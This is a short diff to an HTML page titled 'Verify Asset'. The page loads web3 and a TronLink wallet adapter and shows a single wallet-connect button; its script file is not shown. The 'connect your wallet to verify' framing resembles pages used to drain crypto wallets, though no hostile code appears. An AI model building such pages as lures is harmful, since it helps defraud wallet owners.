@@ -1,21 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Asset Verification</title>
-  <link rel="stylesheet" href="style.css" />
+  <title>Verify Asset</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
 </head>
 <body>
   <div class="container">
-    <div class="card">
-      <h1>Asset Verification</h1>
-      <button id="verifyBtn">Verify Asset</button>
-    </div>
+    <h1>Verify Asset</h1>
+    <button id="connectButton">Verify Asset</button>
+    <p id="status"></p>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/@tronweb3/tronwallet-adapter/dist/index.min.js"></script>
-  <script src="app.js"></script>
+  <script src="main.js"></script>
 </body>
 </html>
